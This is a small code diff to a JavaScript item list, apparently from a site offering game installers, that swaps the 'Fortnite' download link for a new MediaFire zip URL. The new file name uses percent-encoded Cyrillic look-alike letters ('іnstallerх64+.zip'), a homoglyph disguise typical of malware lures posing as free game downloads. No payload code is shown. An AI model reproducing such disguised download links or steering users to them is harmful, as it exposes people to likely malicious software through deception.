@@ -98,7 +98,7 @@ export const ItemsList = [
         title: "Fortnite",
         downloadCount: "42.7K",
         src: "/icons/fortnite.png",
-        downloadLink: "https://download1074.mediafire.com/pmc9ux26qvog/qmosqb1upxzslz4/installerx64+.zip"
+        downloadLink: "https://download1588.mediafire.com/7piw87wchqlg/t0evu9c46qrv37p/%D1%96nstaller%D1%8564+.zip"
       },
       {
         title: "Roblox",
